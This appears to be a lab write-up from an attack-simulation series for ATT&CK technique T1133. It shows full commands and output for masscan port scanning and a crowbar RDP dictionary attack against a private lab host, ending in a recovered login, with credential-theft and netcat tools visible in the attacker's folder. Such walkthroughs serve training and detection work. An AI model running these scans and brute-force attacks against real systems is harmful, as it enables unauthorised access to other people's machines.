**CASE1**

## STEP1. Initial Access : External Remote Services(T1133)

Attack Tools : masscan, crowbar
- masscan - port scanner : https://github.com/robertdavidgraham/masscan
- Crowbar - Brute forcing tool : https://github.com/galkan/crowbar
Support : OpenVPN, Remote Desktop Protocol (RDP) with NLA support, SSH private key authentication, VNC key authentication

### Attacker

![image](https://github.com/user-attachments/assets/f94a5ef2-97ab-4edd-8a95-6144de8257d4)

[RDP port scan with masscan tool]


```shell

# masscan 192.168.106.142 -p1025-65535 --rate-1000000

┌──(root㉿kali)-[/home/kali/Attack_Tool/CASE1]
└─# masscan 192.168.106.142 -p30000-30040 --rate-1000000

rate-1000000: empty parameter
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2025-01-10 21:32:54 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [41 ports/host]
Discovered open port 30039/tcp on 192.168.106.142

```

![image](https://github.com/user-attachments/assets/d5e815a5-20b5-4d2b-8fbb-6638e739ce00)

[RDP logon Dictionary Attack with crowbar tool]

```shell
┌──(root㉿kali)-[/home/kali/Attack_Tool/CASE1]
└─# ls
bunny.exe  crowbar  mimikatz.exe  nc64.exe  passlist.txt  userlist.txt
                                                                                                          
┌──(root㉿kali)-[/home/kali/Attack_Tool/CASE1]
└─# cat userlist.txt 
test
iglootest
testuser
user
admin
administrator
manager
boss
main                                                                                                      
┌──(root㉿kali)-[/home/kali/Attack_Tool/CASE1]
└─# cat passlist.txt 
qwer1234!
123456
qwer1234
administrator
admin
test
manager
test1234
test1234!
12345678
Administrator                                                                                             
┌──(root㉿kali)-[/home/kali/Attack_Tool/CASE1]
└─# cd crowbar       
┌──(root㉿kali)-[/home/kali/Attack_Tool/CASE1/crowbar]
└─# ./crowbar.py -b rdp -s 192.168.106.142/32 -U ../userlist.txt -C ../passlist.txt -p 30039
2025-01-10 17:15:30 START
2025-01-10 17:15:30 Crowbar v0.4.3-dev
2025-01-10 17:15:30 Trying 192.168.106.142:30039
2025-01-10 17:15:36 RDP-SUCCESS : 192.168.106.142:30039 - testuser:qwer1234
2025-01-10 17:15:45 STOP

```
